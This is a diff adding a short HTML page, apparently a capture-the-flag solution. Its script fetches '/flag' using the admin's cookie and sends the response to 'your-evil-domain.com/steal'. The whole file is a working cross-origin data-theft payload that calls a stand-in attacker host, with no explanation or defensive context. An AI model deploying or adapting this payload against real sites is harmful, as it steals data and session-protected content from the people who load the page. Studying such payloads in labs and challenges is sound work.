@@ -1,0 +1,15 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <script>
+      fetch('/flag')                       // This goes to the same origin, with Admin’s JWT cookie
+        .then(response => response.text())
+        .then(flag => {
+            // Exfiltrate the flag back to your server:
+            fetch('https://your-evil-domain.com/steal?flag=' + encodeURIComponent(flag));
+        });
+    </script>
+</body>
+</html>
